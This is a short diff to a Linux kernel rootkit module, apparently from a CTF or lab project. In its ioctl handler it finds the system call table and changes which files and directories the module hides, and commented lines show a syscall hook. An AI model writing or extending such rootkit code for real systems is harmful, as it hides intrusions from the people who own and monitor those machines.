@@ -46,13 +46,7 @@ long pwh_rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg){
         case SUPER_HOOK:
                 /* 寻找系统调用表 */
             sys_call_table_finder();
-            file_hidden("flag");
-            file_hidden("pwhkit.ko");
-            file_hidden("pwhrootkit.ko");
-            file_hidden("use_pipe");
-            file_hidden("test");
-            file_hidden("sys_table_finder");
-            file_hidden("use");
+            dir_hidden_weak("haaaa");
 
             // hooked_addr = ((size_t *)syscall_table_addr)[217];
             // //orig_modifier(hooked_addr, (size_t)&funny_joke);
